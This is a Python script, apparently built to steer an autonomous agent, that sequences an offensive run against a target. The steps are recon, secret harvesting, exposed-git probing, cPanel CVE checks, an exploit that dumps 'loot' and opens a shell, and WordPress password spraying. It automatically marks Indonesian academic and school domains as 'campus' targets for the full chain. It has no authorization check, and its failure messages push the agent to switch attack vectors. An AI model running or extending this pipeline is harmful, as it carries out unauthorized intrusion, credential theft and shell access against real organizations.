#!/usr/bin/env python3
"""autopilot.py — deterministic decision engine for offensive runs.

The agent does not get to guess the next step: it asks this script. State lives in the run
directory as real files, so "done" means "the artifact exists", never "I think it worked".

  autopilot.py plan   <target> [--class web|campus|panel] [--root DIR]
  autopilot.py next   <run-dir>
  autopilot.py done   <run-dir> <step> --status ok|empty|fail --note "..." [--cmd "..."]
  autopilot.py status <run-dir>
  autopilot.py gate   <run-dir> <step>

Exit codes: 0 ok, 3 nothing left to do, 4 gate not satisfied (step cannot run yet).
"""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import sys
import time
from pathlib import Path

HACK = Path(os.environ.get("HACKROOT", str(Path.home() / "hacktools")))
RUNS = Path(os.environ.get("AUTOPILOT_ROOT", str(HACK / "runs")))

# step id, phase, artifacts that prove the step ran, command template ({t}=target, {d}=run dir)
STEPS = [
    ("recon.fingerprint", "recon", ["recon/webleak/summary.json"],
     "python3 {h}/webleak.py {t} -o {d}/recon/webleak"),
    ("exposure.sweep", "exposure", ["exposure/summary.json"],
     "python3 {h}/acidhunt.py -f {d}/targets.txt -o {d}/exposure --workers 24"),
    ("secrets.harvest", "secrets", ["recon/keys/keys.jsonl"],
     "python3 {h}/keyharvest.py -u https://{t} -o {d}/recon/keys"),
    ("git.probe", "exposure", ["git/exposed.txt"],
     "python3 {h}/gitprobe.py {d}/targets.txt {d}/git/exposed.txt"),
    ("cpanel.discover", "panel", ["cpanel/cp_hosts.txt"],
     "python3 {h}/cpanel/cfinder.py -d {t} -o {d}/cpanel --workers 24 --origin"),
    ("panel.cve", "panel", ["cpanel/vulnerable_hosts.txt"],
     "bash {h}/cpanel/cpchain.sh -f {d}/cpanel/cp_hosts.txt --no-scan -o {d}/cpanel --store {d}/cpanel/vulnerable_hosts.txt"),
    ("panel.exploit", "panel", ["cpanel/loot/dump.json"],
     "python3 {h}/cpanel/cpbypass/exploit.py -l {d}/cpanel/vulnerable_hosts.txt --action dump -o {d}/cpanel/loot/dump.json"),
    ("post.shell", "post", ["post/shell.txt"],
     "python3 {h}/cpanel/cpbypass/exploit.py -l {d}/cpanel/vulnerable_hosts.txt --action shell"),
    ("wp.discover", "wp", ["wp/find/summary.json"],
     "python3 {h}/cpanel/wpfinder.py -d {t} -o {d}/wp/find"),
    ("wp.audit", "wp", ["wp/audit.jsonl"],
     "python3 {h}/cpanel/wpaudit.py {d}/targets.txt {d}/wp/audit.jsonl 20 10"),
    ("wp.spray", "wp", ["wp/creds.jsonl"],
     "python3 {h}/cpanel/wpxmlrpc.py {d}/wp/users.txt {d}/wp/pass.txt 20 15"),
]

GATES = {
    "panel.cve": ["cpanel/cp_hosts.txt"],
    "panel.exploit": ["cpanel/vulnerable_hosts.txt"],
    "wp.audit": ["wp/find/summary.json"],
    "wp.spray": ["wp/users.txt", "wp/pass.txt"],
    "post.shell": ["cpanel/vulnerable_hosts.txt"],
}

CLASS_STEPS = {
    "web": ["recon.fingerprint", "exposure.sweep", "secrets.harvest", "git.probe",
            "wp.discover", "wp.audit", "wp.spray"],
    "campus": ["recon.fingerprint", "exposure.sweep", "secrets.harvest", "git.probe", "cpanel.discover",
               "panel.cve", "panel.exploit", "post.shell", "wp.discover", "wp.audit", "wp.spray"],
    "panel": ["cpanel.discover", "panel.cve", "panel.exploit", "post.shell"],
}


def slug(target: str) -> str:
    s = re.sub(r"[^A-Za-z0-9._-]+", "_", target).strip("_")
    return (s or "target")[:60]


def classify(target: str, forced: str | None) -> str:
    if forced:
        return forced
    t = target.lower()
    if re.search(r"\.(ac|sch|edu)\.id$", t) or ".ac.id:" in t:
        return "campus"
    if re.search(r":(2082|2083|2086|2087|2095|2096)\b", t):
        return "panel"
    return "web"


def now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def jread(p: Path) -> dict:
    try:
        return json.loads(p.read_text())
    except Exception:
        return {}


def journal(run: Path) -> list[dict]:
    p = run / "journal.jsonl"
    if not p.exists():
        return []
    out = []
    for line in p.read_text().splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            out.append(json.loads(line))
        except Exception:
            continue
    return out


def append_journal(run: Path, rec: dict) -> None:
    run.mkdir(parents=True, exist_ok=True)
    with (run / "journal.jsonl").open("a") as fh:
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")


def step_map() -> dict[str, tuple]:
    return {s[0]: s for s in STEPS}


def artifacts_missing(run: Path, step: str) -> list[str]:
    rec = step_map().get(step)
    if not rec:
        return []
    return [a for a in rec[2] if not (run / a).exists()]


def cmd_for(run: Path, step: str) -> str:
    rec = step_map()[step]
    meta = jread(run / "meta.json")
    return rec[3].format(h=str(HACK), t=meta.get("target", ""), d=str(run))


def plan_cmd(args) -> int:
    target = args.target.strip()
    if not target:
        print("target kosong", file=sys.stderr)
        return 2
    run = (Path(args.root).expanduser() / slug(target) if args.root else RUNS / slug(target)).resolve()
    klass = classify(target, args.klass)
    run.mkdir(parents=True, exist_ok=True)
    meta = jread(run / "meta.json")
    meta.update({"target": target, "class": klass, "created": meta.get("created", now())})
    (run / "meta.json").write_text(json.dumps(meta, indent=2) + "\n")
    for sub in ("recon", "exposure", "cpanel/loot", "wp", "git", "post"):
        (run / sub).mkdir(parents=True, exist_ok=True)
    if not (run / "targets.txt").exists():
        (run / "targets.txt").write_text(target + "\n")
    print(f"run_dir: {run}")
    print(f"class:   {klass}")
    print("plan:")
    for i, sid in enumerate(CLASS_STEPS[klass], 1):
        print(f"  {i}. {sid:18s} -> {', '.join(step_map()[sid][2])}")
        print(f"     {cmd_for(run, sid)}")
    append_journal(run, {"ts": now(), "step": "plan", "status": "ok", "note": klass, "target": target})
    print("\njalankan `autopilot.py next " + str(run) + "` sebelum tiap langkah.")
    return 0


def next_cmd(args) -> int:
    run = Path(args.run_dir).expanduser().resolve()
    meta = jread(run / "meta.json")
    if not meta:
        print(f"bukan run dir: {run}", file=sys.stderr)
        return 2
    klass = meta.get("class", "web")
    last: dict[str, str] = {}
    for j in journal(run):
        if j.get("step") in step_map():
            last[j["step"]] = str(j.get("status"))
    pending = None
    retry = False
    for sid in CLASS_STEPS.get(klass, CLASS_STEPS["web"]):
        st = last.get(sid)
        if st == "ok" and not artifacts_missing(run, sid):
            continue
        if st == "empty":
            continue
        need = GATES.get(sid, [])
        gate_missing = [g for g in need if not (run / g).exists() or not (run / g).stat().st_size]
        if gate_missing:
            print(f"BLOCKED {sid}: butuh {', '.join(gate_missing)}")
            print("  -> kerjakan langkah yang menghasilkan file itu dulu (lihat `status`).")
            return 4
        pending = sid
        retry = st == "fail"
        break
    if pending is None:
        print("SEMUA LANGKAH SELESAI / tidak ada artefak baru.")
        print("KEPUTUSAN: ganti vektor, jangan ulang perintah identik. Pilihan:")
        print("  1. subdomain/vhost: python3 {h}/cpanel/cfinder.py -f hosts.txt --ports 2082,2083,2086,2087,2095,2096 -o {d}/cpanel2 --origin".replace("{h}", str(HACK)).replace("{d}", str(run)))
        print(f"  2. perluas port web:   python3 {HACK}/webleak.py -f {run}/targets.txt -o {run}/recon/webleak2.json")
        print(f"  3. tarik sumber:       python3 {HACK}/cpanel/git_full.py {meta.get('target')} {run}/git2")
        print("  Kalau tiga vektor ini juga kosong, laporkan TERBUKA (bukti kosong) dan berhenti.")
        return 3
    if retry:
        print(f"NEXT: {pending} (RETRY — percobaan sebelumnya gagal)")
        print("ATURAN: jangan ulang perintah identik. Ubah satu variabel dulu:")
        print(f"  a. perbesar timeout/worker: {cmd_for(run, pending)} --timeout 30 --workers 8")
        print(f"  b. ganti sudut: port lain / host lain / tld lain")
        print(f"  c. turun satu lapis: cari artefak mentah di {run} lalu baca manual")
    else:
        print(f"NEXT: {pending}")
    print(f"CMD:  {cmd_for(run, pending)}")
    need = GATES.get(pending, [])
    if need:
        print(f"GATE: {', '.join(need)} (sudah terpenuhi)")
    print(f"PROOF: {', '.join(step_map()[pending][2])} — setelah jalan, catat:")
    print(f"  python3 {HACK}/autopilot.py done {run} {pending} --status ok --note \"exit=0, N hasil\"")
    return 0


def done_cmd(args) -> int:
    run = Path(args.run_dir).expanduser().resolve()
    if not (run / "meta.json").exists():
        print(f"bukan run dir: {run}", file=sys.stderr)
        return 2
    missing = artifacts_missing(run, args.step)
    if args.status == "ok" and missing:
        print(f"TOLAK status ok: artefak belum ada -> {', '.join(missing)}", file=sys.stderr)
        print("kalau langkah memang kosong, pakai --status empty (itu bukti nyata: sudah dicoba).", file=sys.stderr)
        return 5
    append_journal(run, {
        "ts": now(), "step": args.step, "status": args.status,
        "note": args.note or "", "cmd": args.cmd or "", "missing": missing,
    })
    print(f"recorded {args.step}={args.status}")
    return 0


def status_cmd(args) -> int:
    run = Path(args.run_dir).expanduser().resolve()
    meta = jread(run / "meta.json")
    if not meta:
        print(f"bukan run dir: {run}", file=sys.stderr)
        return 2
    print(f"target: {meta.get('target')}  class: {meta.get('class')}  dir: {run}")
    rows = journal(run)
    for j in rows:
        print(f"  {j.get('ts','')}  {str(j.get('step')):18s} {str(j.get('status')):6s} {j.get('note','')}")
    for sid in CLASS_STEPS.get(meta.get("class", "web"), []):
        miss = artifacts_missing(run, sid)
        mark = "OK " if not miss else "---"
        print(f"  [{mark}] {sid:18s} {('missing: ' + ', '.join(miss)) if miss else ''}")
    return 0


def gate_cmd(args) -> int:
    run = Path(args.run_dir).expanduser().resolve()
    need = GATES.get(args.step, [])
    bad = [g for g in need if not (run / g).exists() or not (run / g).stat().st_size]
    if bad:
        print(f"GATE FAIL {args.step}: {', '.join(bad)}")
        return 4
    print(f"GATE OK {args.step}")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="autopilot decision engine")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("plan"); p.add_argument("target"); p.add_argument("--class", dest="klass", choices=["web", "campus", "panel"]); p.add_argument("--root"); p.set_defaults(fn=plan_cmd)
    p = sub.add_parser("next"); p.add_argument("run_dir"); p.set_defaults(fn=next_cmd)
    p = sub.add_parser("done"); p.add_argument("run_dir"); p.add_argument("step")
    p.add_argument("--status", required=True, choices=["ok", "empty", "fail"]); p.add_argument("--note"); p.add_argument("--cmd"); p.set_defaults(fn=done_cmd)
    p = sub.add_parser("status"); p.add_argument("run_dir"); p.set_defaults(fn=status_cmd)
    p = sub.add_parser("gate"); p.add_argument("run_dir"); p.add_argument("step"); p.set_defaults(fn=gate_cmd)

    args = ap.parse_args()
    return args.fn(args)


if __name__ == "__main__":
    sys.exit(main())
